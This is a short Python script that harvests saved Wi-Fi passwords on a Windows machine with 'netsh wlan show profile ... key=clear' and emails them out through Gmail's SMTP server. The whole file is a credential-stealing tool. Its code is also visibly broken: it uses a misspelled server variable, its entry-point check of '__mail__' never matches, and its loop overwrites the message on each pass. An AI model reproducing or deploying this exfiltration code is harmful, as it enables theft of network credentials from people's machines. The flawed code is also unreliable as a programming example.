#!/usr/bin/env python

import subprocess, smtplib
import re

# Send mail using smtp of an email server
def send_mail(email, password, message):

	# In this case, the Gmail smtp server is used
	smtp_server = smtplib.SMTP("smtp.gmail.com", 587) 
	smtp_server.starttls()
	smtp_smtp_server.login(email, password)
	smtp_server.sendmail(email,email,message) #Sending the mail to self
	smtp_server.quit()


if __name__ == "__mail__":
	# Command to show all Wifi profile networks connected to the machines
	command = "netsh wlan show profile"
	networks = subprocess.check_output(command,shell=True) 
	network_profile_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

	message = ""

	# Filling the message with all retrieved Wifi Network profiles
	for profile in network_profile_names:

		command = "netsh wlan show profile " + profile.strip() + " key=clear"
		result = subprocess.check_output(command,shell=True)

		message = "\n\n" + result

	# print(message)
	username = "" # Username for your email
	password = "" # Password for your email
	send_mail(username, password, message)